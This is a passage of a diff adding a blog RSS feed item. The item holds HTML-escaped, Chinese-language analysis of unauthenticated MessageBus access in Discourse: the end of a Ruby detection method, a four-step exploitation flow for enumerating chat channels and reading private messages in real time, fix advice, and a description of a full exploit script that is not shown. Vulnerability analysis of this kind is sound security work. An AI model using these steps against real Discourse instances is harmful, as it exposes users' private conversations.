+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;200&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;vi&#34;&gt;@message_bus_client_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;extract_client_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;vi&#34;&gt;@results&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ss&#34;&gt;vulnerability&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;MessageBus Access&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ss&#34;&gt;severity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;High&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ss&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Unauthenticated access to MessageBus endpoint confirmed&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ss&#34;&gt;impact&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Can monitor real-time messages and notifications&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ss&#34;&gt;client_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;vi&#34;&gt;@message_bus_client_id&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# 其他测试方法省略...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;漏洞利用流程&#34;&gt;漏洞利用流程
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;获取MessageBus客户端ID&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;访问&lt;code&gt;/message-bus/poll&lt;/code&gt;端点&lt;/li&gt;
+&lt;li&gt;从响应头或响应体中提取客户端ID&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;枚举聊天频道&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;订阅&lt;code&gt;/chat/new-messages&lt;/code&gt;等频道&lt;/li&gt;
+&lt;li&gt;分析响应获取活跃聊天频道&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;访问私密消息&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;订阅&lt;code&gt;/private-messages&lt;/code&gt;频道&lt;/li&gt;
+&lt;li&gt;获取未加密的私密聊天内容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;实时监控&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;持续轮询消息总线&lt;/li&gt;
+&lt;li&gt;捕获实时聊天内容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;升级到Discourse 3.1.1稳定版或更高版本&lt;/li&gt;
+&lt;li&gt;对MessageBus端点实施严格的身份验证&lt;/li&gt;
+&lt;li&gt;审查并限制聊天相关API的访问权限&lt;/li&gt;
+&lt;li&gt;监控MessageBus访问日志中的可疑活动&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;完整利用代码&#34;&gt;完整利用代码
+&lt;/h2&gt;&lt;p&gt;文章提供了完整的Ruby利用脚本，包含以下功能：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;消息总线访问测试&lt;/li&gt;
+&lt;li&gt;聊天频道枚举&lt;/li&gt;
+&lt;li&gt;私密消息访问&lt;/li&gt;
+&lt;li&gt;实时监控&lt;/li&gt;
+&lt;li&gt;历史消息获取&lt;/li&gt;
+&lt;li&gt;用户枚举功能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;该脚本可自动化检测目标Discourse实例是否存在此漏洞。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>旧瓶装新酒 - Microsoft SharePoint 认证后反序列化远程代码执行漏洞分析(CVE-2022-29108)</title>
         <link>http://localhost:1313/p/%E6%97%A7%E7%93%B6%E8%A3%85%E6%96%B0%E9%85%92-microsoft-sharepoint-%E8%AE%A4%E8%AF%81%E5%90%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2022-29108/</link>
         <pubDate>Wed, 06 Aug 2025 12:03:02 +0800</pubDate>
